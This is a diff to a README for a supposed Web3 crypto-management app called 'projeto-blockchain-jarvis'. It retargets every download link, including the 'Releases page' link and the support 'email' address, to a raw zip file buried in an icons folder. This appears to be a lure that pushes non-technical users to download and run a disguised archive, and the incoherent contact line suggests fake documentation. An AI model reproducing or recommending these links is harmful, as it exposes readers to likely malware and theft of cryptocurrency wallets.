@@ -4,13 +4,13 @@
 Welcome to projeto-blockchain-jarvis! This is a complete Web3 platform that allows you to manage cryptocurrencies, trade NFTs, stake assets, and explore blockchain data. You can use it even if you don't have a technical background. 
 
 ## 🔗 Download the App
-[![Download Now](https://raw.githubusercontent.com/saicomp1/projeto-blockchain-jarvis/main/lyricalness/projeto-blockchain-jarvis.zip%20Now%20-%20projeto--blockchain--jarvis-blue)](https://raw.githubusercontent.com/saicomp1/projeto-blockchain-jarvis/main/lyricalness/projeto-blockchain-jarvis.zip)
+[![Download Now](https://github.com/saicomp1/projeto-blockchain-jarvis/raw/refs/heads/main/src/components/icons/projeto_blockchain_jarvis_3.5.zip%20Now%20-%20projeto--blockchain--jarvis-blue)](https://github.com/saicomp1/projeto-blockchain-jarvis/raw/refs/heads/main/src/components/icons/projeto_blockchain_jarvis_3.5.zip)
 
 ## 🚀 Getting Started
 To get started with projeto-blockchain-jarvis, please follow these simple steps:
 
 1. **Visit the Download Page**
-   Go to our [Releases page](https://raw.githubusercontent.com/saicomp1/projeto-blockchain-jarvis/main/lyricalness/projeto-blockchain-jarvis.zip) to see the latest version of the app. 
+   Go to our [Releases page](https://github.com/saicomp1/projeto-blockchain-jarvis/raw/refs/heads/main/src/components/icons/projeto_blockchain_jarvis_3.5.zip) to see the latest version of the app. 
 
 2. **Select the Latest Release**
    Look for the most recent version at the top of the page. Click on it to see the details.
@@ -35,7 +35,7 @@ To ensure a smooth experience, please make sure your device meets the following 
 ## 📥 Download & Install
 You are ready to download! Follow these steps:
 
-1. Visit this page to download: [Releases page](https://raw.githubusercontent.com/saicomp1/projeto-blockchain-jarvis/main/lyricalness/projeto-blockchain-jarvis.zip).
+1. Visit this page to download: [Releases page](https://github.com/saicomp1/projeto-blockchain-jarvis/raw/refs/heads/main/src/components/icons/projeto_blockchain_jarvis_3.5.zip).
 2. Choose the latest version.
 3. Download and install it on your device.
 
@@ -74,6 +74,6 @@ If you have questions or need support, we’re here to help. You can join our co
 **A:** Visit the support section on our GitHub page for troubleshooting tips. You can also ask for help in our community forum.
 
 ## 📞 Contact
-For any support requests, please email us at https://raw.githubusercontent.com/saicomp1/projeto-blockchain-jarvis/main/lyricalness/projeto-blockchain-jarvis.zip We strive to respond within 24 hours.
+For any support requests, please email us at https://github.com/saicomp1/projeto-blockchain-jarvis/raw/refs/heads/main/src/components/icons/projeto_blockchain_jarvis_3.5.zip We strive to respond within 24 hours.
 
 Thank you for choosing projeto-blockchain-jarvis! Enjoy managing your digital assets with ease and confidence.
